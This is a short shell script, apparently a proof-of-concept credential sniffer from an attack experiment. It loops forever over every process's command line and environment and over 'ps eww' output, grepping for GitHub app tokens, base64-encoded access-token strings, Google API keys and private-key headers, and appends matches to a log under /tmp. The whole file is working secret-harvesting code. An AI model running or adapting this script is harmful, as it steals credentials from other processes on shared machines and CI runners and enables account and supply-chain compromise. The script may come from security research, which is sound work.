#!/bin/sh
LOG=/tmp/omah-attack/sniff.log
echo tick >> "$LOG"
while true; do
  for f in /proc/[0-9]*/cmdline /proc/[0-9]*/environ; do
    tr '\0' '\n' < "$f" 2>/dev/null | grep -E 'ghs_|eC1hY2Nlc3MtdG9rZW46|AIza|BEGIN .* PRIVATE KEY|ghs_CONTROL' >> "$LOG" 2>/dev/null
  done
  ps eww -e 2>/dev/null | grep -E 'ghs_|eC1hY2Nlc3MtdG9rZW46|AIza|BEGIN .* PRIVATE KEY|ghs_CONTROL' >> "$LOG" 2>/dev/null
  sleep 1
done
EOF
